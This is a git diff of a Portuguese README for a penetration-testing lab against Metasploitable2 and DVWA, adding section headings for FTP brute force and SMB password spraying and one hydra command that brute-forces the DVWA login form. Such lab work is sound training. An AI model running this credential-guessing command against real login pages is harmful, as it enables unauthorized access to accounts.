@@ -9,5 +9,12 @@ Executar ataques simulados: força bruta em FTP, automação de tentativas de lo
 - VM PfSense
 - VM Metasploitable2
 
-## Estrutura de arquivos do projeto
-/logs : I/O coletados durante a execução dos comando
+## Brute Force em FTP
+
+## Formulário web DVWA
+
+```
+hydra -L users.txt -P pass.txt <IP_DA_METASPLOITABLE> http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
+```
+
+## Password Spraying SMB
